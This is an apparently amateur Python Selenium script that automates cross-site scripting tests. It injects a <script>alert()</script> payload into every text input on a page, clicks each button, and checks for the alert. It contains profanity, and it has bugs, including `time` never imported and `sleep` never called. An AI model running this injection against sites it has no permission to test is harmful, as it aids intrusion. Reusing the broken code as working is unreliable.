from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.alert import Alert
import pandas as pd

main_injection = '<script>alert("bGljayBteSBiYWxscw")</script>'
Array_of_results = []
site = None

#def refresh(file_way):
    #global site
    #site.close()
    #options = Options()
    #options.headless = True
    #site = webdriver.Firefox(options=options)
    #site.get(file_way)


def prnt_info(title, file_way):
    print("[  ?  ] Link of site: " + file_way)
    print("[  ?  ] Title of site: " + title)

def quick_test():
    #try:
        Array_of_in = site.find_elements_by_xpath('//input[@type="text"]')

        if len(Array_of_in) == 0:
            print("[  -  ] There is no way to attack.")
            return 0
        else:
            print("[  ?  ] There is " + str(len(Array_of_in)) + " potentian ways to attack.")
            return Array_of_in
    #except:
        #print("[  -  ] Something wrong with quick test. \n")


def prepare(file_way):
    global site
    file_way_g = file_way
    options = Options()
    options.headless = True
    site = webdriver.Firefox(options=options)
    #site = webdriver.Firefox()
    site.get(file_way)

    return site

def find_buttons():
    try:
        Array_of_butt = site.find_elements_by_xpath('//input[@type="button"]')
        if len(Array_of_butt) == 0:
            print("[  -  ] There is no way to upload injection.")
            return 0
        else:
            print("[  ?  ] There is " + str(len(Array_of_butt)) + " potentian ways to upload injection.\n")
            return Array_of_butt

    except:
        print("[  -  ] Something wrong with buttons of this website. \n")

def test_arrays(Array_of_in, Array_of_butt, file_way):
    for but in Array_of_butt:
        check = write_injections(Array_of_in)
        if check == 0:
            return 0
        but.click()
        check_alerts()
        site.refresh()
        time.sleep

def check_alerts():
    alert = Alert(site)
    if alert.text == "bGljayBteSBiYWxscw":
        print("[  !  ] Found the vulnerability !")
        alert.accept()

def write_injections(Array_of_in):
    #try:
        for inpt in Array_of_in:
            inpt.send_keys(main_injection)
    #except:
        #print("[  -  ] Something wrong with writing injections. \n")
        #return 0

def main_test(file_way):
    #try:
        site = prepare(file_way)
        prnt_info(site.title, file_way)
        Array_of_in = quick_test()
        if Array_of_in == 0:
            raise Exception('fuck', 'fuck')
        Array_of_butt = find_buttons()
        if Array_of_butt == 0:
            raise Exception('fuck', 'fuck')
        result = test_arrays(Array_of_in, Array_of_butt, file_way)
        if result == 0:
            raise Exception('fuck', 'fuck')

    #except:
        #print("[  -  ] Everything is ruined. This is what you wanted? \n")
    #el = site.find_element_by_xpath('//input[@type="text"]')
    #el.send_keys('<script>alert("bGljayBteSBiYWxscw")</script>')
    #button = site.find_element_by_xpath('//input[@type="button"]')
    #button.click()
    #alert = Alert(site)
    #try:
        #if alert.text == "bGljayBteSBiYWxscw":
            #print("There is some dirty stuff!")
            #alert.accept()
    #except:
        #print("No alert")

